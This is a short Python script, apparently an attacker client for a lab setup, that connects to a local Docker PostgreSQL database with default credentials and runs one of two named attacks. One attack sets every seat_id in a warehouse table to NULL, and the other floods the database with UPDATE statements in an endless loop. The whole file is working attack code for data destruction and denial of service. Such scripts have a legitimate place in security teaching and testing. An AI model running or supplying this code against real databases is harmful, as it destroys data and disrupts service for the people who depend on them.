import psycopg2

def client_program():
    # note: use one of the following attack functions and comment out the other one
    dosAttack()
    eraseOccupancyInformation()

def eraseOccupancyInformation():
    # create connection to database
    db_conn = psycopg2.connect(
        database="postgres", user='postgres', password='docker', host='host.docker.internal', port= '5432'
    )
    cursor = db_conn.cursor()
    # erase occupancy information
    attacker_query = "UPDATE warehouse SET seat_id = NULL"
    cursor.execute(attacker_query)
    db_conn.commit()

def dosAttack():
    # create connection to database
    db_conn = psycopg2.connect(
        database="postgres", user='postgres', password='docker', host='host.docker.internal', port= '5432'
    )
    cursor = db_conn.cursor()
    # continously execute an update statement
    dos_query = "update dos_table set column1 = 'xxx'"
    while True:
        cursor.execute(dos_query)
        db_conn.commit()

if __name__ == '__main__':
    client_program()
